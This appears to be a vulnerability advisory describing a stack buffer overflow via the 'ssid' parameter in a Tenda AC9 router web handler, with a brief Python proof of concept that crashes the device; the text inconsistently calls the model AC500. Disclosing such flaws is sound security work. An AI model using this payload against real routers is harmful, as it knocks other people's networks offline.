# Tenda Router AC9 Vulnerability
This vulnerability lies in the `/goform/fast_setting_wifi_set` page which influences the lastest version of Tenda Router AC500. (The latest version is [AC9V3.0_V15.03.06.42_multi](https://www.tenda.com.cn/download/detail-2908.html))
## Vulnerability Description
There is a stack-based buffer overflow vulnerability in function `form_fast_setting_wifi_set`.

In function `form_fast_setting_wifi_set` it reads user provided parameter `ssid` into `src`, and this variable is passed into function `strcpy` without any length check, which may overflow the stack-based buffer `s`.
![](https://github.com/Funcy33/Vluninfo_Repo/blob/main/CNVDs/171_1/vlun.png)

So by requesting the page `/goform/fast_setting_wifi_set`, the attacker can easily perform a Deny of Service Attack.
## POC
```
import requests

IP = "10.10.10.1"
url = f"http://{IP}/goform/fast_setting_wifi_set?"
url += "ssid=" + "s" * 100

response = requests.get(url)
```
## Timeline
## Acknowledgment
Credit to [@Funcy_kilar](https://github.com/Funcy33) from Guangzhou University.
